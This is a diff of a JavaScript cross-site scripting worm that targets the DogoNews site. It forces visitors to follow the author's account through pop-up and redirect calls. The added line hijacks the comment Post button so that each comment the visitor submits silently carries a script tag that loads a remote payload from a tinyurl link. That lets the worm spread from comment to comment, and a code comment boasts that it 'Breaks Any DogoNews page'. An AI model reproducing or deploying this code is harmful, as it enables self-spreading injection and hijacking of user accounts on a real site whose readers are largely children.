@@ -4,7 +4,7 @@ var p='<script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>'; //
 var myPopup = window.open('https://www.dogonews.com/i/imarebel/follow'); //Open follow window
 myPopup.addEventListener('load', window.close, false); //close window when finished
 window.location = 'https://www.dogonews.com/i/imarebel/follow'; //Just incase user is not folowing me  :D
-
+$('input[value$=Post]').first().attr('type','button').attr('onclick','var k=$(\'textarea#comment_body.text.required.form-control\').first();var f=k.val();k.val(f+p);k.parent().parent().parent().submit();'); //Automatic Inject to next comment
 /*
 Breaks Any DogoNews page:
 <script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>
